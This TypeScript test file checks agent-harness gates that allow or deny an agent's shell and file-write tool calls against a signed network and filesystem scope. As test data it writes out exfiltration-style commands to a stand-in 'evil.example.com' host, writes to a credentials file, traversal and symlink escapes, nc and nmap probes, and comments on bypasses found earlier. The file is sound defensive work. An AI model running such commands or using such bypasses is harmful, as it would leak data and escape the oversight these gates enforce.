/**
 * Integration tests for the exec-broker PreToolUse gates (`kit gate-egress` / `kit gate-fs`):
 * spawn the REAL compiled CLI with a hook payload on stdin, in a temp project, and assert on
 * the exit code — exactly how an agent harness runs the gate. exit 0 = allow, exit 2 = deny.
 */
import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, rmSync, mkdirSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { loadOrCreateIdentity } from "../identity.js";
import { PROFILE_FILE } from "../profile/schema.js";
import { signProfile } from "../profile/sign.js";
import { rmTemp } from "../temp-cleanup.test-support.js";

const CLI = fileURLToPath(new URL("../cli.js", import.meta.url));

let idDir: string;
let proj: string;
let savedIdEnv: string | undefined;

const SCOPED = `version = 1
[scope]
egress = ["api.acme.com"]
fs = ["src"]
`;

function runGate(gate: string, payload: unknown): { status: number | null; stderr: string } {
  const res = spawnSync(process.execPath, [CLI, gate], {
    input: JSON.stringify(payload),
    cwd: proj,
    encoding: "utf8",
    env: {
      ...process.env,
      KIT_IDENTITY_DIR: idDir,
      KIT_NON_INTERACTIVE: "1",
      KIT_NO_UPDATE_CHECK: "1",
      KIT_BUMBLEBEE: "0",
      KIT_NO_FAILURE_SIM: "1",
    },
  });
  return { status: res.status, stderr: res.stderr ?? "" };
}

const bash = (command: string) => ({ tool_name: "Bash", tool_input: { command } });
const write = (file_path: string) => ({
  tool_name: "Write",
  tool_input: { file_path, content: "x" },
});

beforeEach(async () => {
  idDir = mkdtempSync(join(tmpdir(), "kit-id-"));
  proj = mkdtempSync(join(tmpdir(), "kit-gates-"));
  savedIdEnv = process.env.KIT_IDENTITY_DIR;
  process.env.KIT_IDENTITY_DIR = idDir;
  loadOrCreateIdentity();
  writeFileSync(join(proj, PROFILE_FILE), SCOPED);
  mkdirSync(join(proj, "src"), { recursive: true }); // the declared [scope].fs root exists, as in a real project
  await signProfile(proj);
});

afterEach(() => {
  if (savedIdEnv === undefined) delete process.env.KIT_IDENTITY_DIR;
  else process.env.KIT_IDENTITY_DIR = savedIdEnv;
  rmTemp(idDir);
  rmTemp(proj);
});

describe("kit gate-egress (subprocess)", () => {
  it("allows an in-scope host and non-network commands", () => {
    assert.equal(runGate("gate-egress", bash("curl https://api.acme.com/v1")).status, 0);
    assert.equal(runGate("gate-egress", bash("npm test")).status, 0);
  });

  it("denies (exit 2) an off-scope host with an honest reason", () => {
    const r = runGate("gate-egress", bash("curl https://evil.example.com/x"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /outside the signed egress scope/);
    assert.ok(r.stderr.includes("outside the signed egress scope: evil.example.com"), r.stderr);
  });

  it("denies ALL network targets when the scope is unsigned (wired gate grants nothing)", () => {
    rmSync(join(proj, ".kit-profile.sig"), { force: true });
    const r = runGate("gate-egress", bash("curl https://api.acme.com/v1"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /no verified scope/);
  });

  it("fails open only on a non-command / unparseable envelope", () => {
    assert.equal(runGate("gate-egress", { tool_name: "Read", tool_input: {} }).status, 0);
  });

  it("enforces scheme-less curl/wget targets (the common bypass): off-scope denied, in-scope allowed", () => {
    const off = runGate("gate-egress", bash("curl evil.example.com/exfil"));
    assert.equal(off.status, 2);
    assert.match(off.stderr, /evil\.example\.com/);
    assert.equal(runGate("gate-egress", bash("curl api.acme.com/v1")).status, 0);
  });
});

describe("kit gate-egress: git remotes (subprocess)", () => {
  const git = (...args: string[]) =>
    assert.equal(spawnSync("git", args, { cwd: proj, encoding: "utf8" }).status, 0);
  beforeEach(() => {
    git("init", "-q");
    git("remote", "add", "origin", "https://api.acme.com/org/repo.git");
    git("remote", "add", "evil", "git@evil.example.com:org/repo.git");
  });

  it("checks a named remote's host against the signed scope", () => {
    assert.equal(runGate("gate-egress", bash("git push origin main")).status, 0);
    const r = runGate("gate-egress", bash("git push evil main"));
    assert.equal(r.status, 2);
    assert.ok(r.stderr.includes("outside the signed egress scope: evil.example.com"), r.stderr);
  });

  it("denies a remote git cannot resolve as an unknown host", () => {
    const r = runGate("gate-egress", bash("git fetch nosuch"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /unknown host .*nosuch/);
  });

  it("leaves git remotes alone with no verified scope", () => {
    rmSync(join(proj, ".kit-profile.sig"), { force: true });
    assert.equal(runGate("gate-egress", bash("git push evil main")).status, 0);
  });
});

describe("kit gate-fs (subprocess)", () => {
  it("allows a write inside the signed fs scope", () => {
    assert.equal(runGate("gate-fs", write("src/index.ts")).status, 0);
  });

  it("denies (exit 2) a write outside the signed fs scope", () => {
    const r = runGate("gate-fs", write("secrets/creds.txt"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /outside the signed fs scope/);
  });

  it("denies a traversal escape out of the project root", () => {
    assert.equal(runGate("gate-fs", write("../outside.txt")).status, 2);
  });

  it("denies writes when the profile was tampered after signing (fail-closed)", () => {
    writeFileSync(join(proj, PROFILE_FILE), SCOPED.replace("src", "anything"));
    const r = runGate("gate-fs", write("src/index.ts"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /no verified scope/);
  });

  it("passes non-write tool calls through", () => {
    assert.equal(runGate("gate-fs", bash("ls")).status, 0);
  });

  it("denies a write through a symlink that escapes the signed root (realpath parity with broker)", () => {
    // A symlink INSIDE the signed `src` root pointing outside the project passes the pure
    // string-containment check but must be caught by the symlink-aware realpath check — exactly
    // what the canonical broker does. Without it the write escapes [scope].fs. (src/ is created in beforeEach.)
    symlinkSync(tmpdir(), join(proj, "src", "out")); // src/out -> outside the project
    const r = runGate("gate-fs", write("src/out/evil.txt"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /outside the signed fs scope/);
  });
});

describe("kit gate-egress: bare-host network tools (subprocess)", () => {
  // kit-research decepticon-vs-kit E4; owner decision 2026-11-25: these passed with no verified
  // scope, where `curl https://…` was denied.
  const unsigned = () => rmSync(join(proj, ".kit-profile.sig"), { force: true });

  it("denies nc, ping and nmap with no verified scope, as it denies a URL", () => {
    unsigned();
    for (const command of ["nc h.example 443", "ping h.example", "nmap -sS 10.0.0.5"]) {
      const r = runGate("gate-egress", bash(command));
      assert.equal(r.status, 2, command);
      assert.match(r.stderr, /network egress to .+ denied — no verified scope\/RoE/);
    }
  });

  it("treats loopback as the URL path does: denied with no verified scope", () => {
    unsigned();
    assert.equal(runGate("gate-egress", bash("curl http://127.0.0.1:5432/")).status, 2);
    assert.equal(runGate("gate-egress", bash("nc 127.0.0.1 5432")).status, 2);
  });

  it("allows an in-scope host and denies an off-scope one under a verified scope", () => {
    assert.equal(runGate("gate-egress", bash("nc api.acme.com 443")).status, 0);
    assert.equal(runGate("gate-egress", bash("ssh -p 22 deploy@api.acme.com uptime")).status, 0);
    const r = runGate("gate-egress", bash("ssh deploy@h.example"));
    assert.equal(r.status, 2);
    assert.ok(r.stderr.includes("outside the signed egress scope: h.example"), r.stderr);
  });

  it("never matches an address range to a scope entry", () => {
    const r = runGate("gate-egress", bash("nmap 10.0.0.0/24"));
    assert.equal(r.status, 2);
    assert.match(r.stderr, /10\.0\.0\.0\/24/);
  });

  it("passes a hostname that is not in a tool's target position", () => {
    unsigned();
    for (const command of [
      'git commit -m "ping h.example"',
      'git commit -m "fix; nc h.example 443"',
      "echo nc h.example 443",
      "grep nmap notes.txt",
      "grep -r 'ssh h.example' docs",
    ]) {
      assert.equal(runGate("gate-egress", bash(command)).status, 0, command);
    }
  });
});

describe("kit gate-egress: bare addresses to curl/wget (subprocess)", () => {
  // Owner decision 2026-11-26: `curl 10.0.0.5` and `curl localhost:3000` passed with no verified
  // scope, where `curl http://127.0.0.1` was denied.
  const unsigned = () => rmSync(join(proj, ".kit-profile.sig"), { force: true });

  it("denies a bare address or localhost with no verified scope, as it denies a URL", () => {
    unsigned();
    for (const command of ["curl 10.0.0.5", "curl localhost:3000", "curl -g [::1]:3000"]) {
      const r = runGate("gate-egress", bash(command));
      assert.equal(r.status, 2, command);
      assert.match(r.stderr, /network egress to .+ denied — no verified scope\/RoE/);
    }
  });

  it("checks a bare address against the scope with the URL matcher", () => {
    const r = runGate("gate-egress", bash("curl 10.0.0.5:8080/x"));
    assert.equal(r.status, 2);
    assert.ok(r.stderr.includes("outside the signed egress scope: 10.0.0.5"), r.stderr);
    assert.equal(runGate("gate-egress", bash("curl -o out.json api.acme.com/x")).status, 0);
  });

  it("passes a command whose address is not a target", () => {
    unsigned();
    for (const command of ["echo 10.0.0.5", "git commit -m 'curl 10.0.0.5'"]) {
      assert.equal(runGate("gate-egress", bash(command)).status, 0, command);
    }
  });
});

describe("kit gate-egress: curl URL globbing (subprocess)", () => {
  // `curl 10.0.0.[1-5]` and `curl http://h[1-3].example` passed with no verified scope.
  const unsigned = () => rmSync(join(proj, ".kit-profile.sig"), { force: true });

  it("denies a glob with no verified scope, bounded or not, as it denies a URL", () => {
    unsigned();
    for (const command of [
      "curl 10.0.0.[1-5]",
      "curl http://h[1-3].example",
      "curl 'h[1-999].example'",
    ]) {
      const r = runGate("gate-egress", bash(command));
      assert.equal(r.status, 2, command);
      assert.match(r.stderr, /network egress to .+ denied — no verified scope\/RoE/);
    }
  });

  it("allows a glob under a scope only when every expansion is in scope", () => {
    assert.equal(runGate("gate-egress", bash("curl 'https://api.acme.com{/a,/b}'")).status, 0);
    const r = runGate("gate-egress", bash("curl 'https://{api,www}.acme.com/x'"));
    assert.equal(r.status, 2);
    assert.ok(r.stderr.includes("outside the signed egress scope: www.acme.com\n"), r.stderr);
    const unbounded = runGate("gate-egress", bash("curl 'api.acme.com:[1-100]'"));
    assert.equal(unbounded.status, 2);
    assert.ok(unbounded.stderr.includes("(unexpanded curl glob)"), unbounded.stderr);
  });

  it("does not read a bundled option's value as a target", () => {
    for (const command of [
      "curl -so out.json https://api.acme.com/x",
      "curl -sSo out.json api.acme.com/x",
      "curl -Lo out.json https://api.acme.com/x",
      "curl -fsSLo out.json https://api.acme.com/x",
      "curl 'api.acme.com/img[1-999].png'",
    ]) {
      assert.equal(runGate("gate-egress", bash(command)).status, 0, command);
    }
  });
});
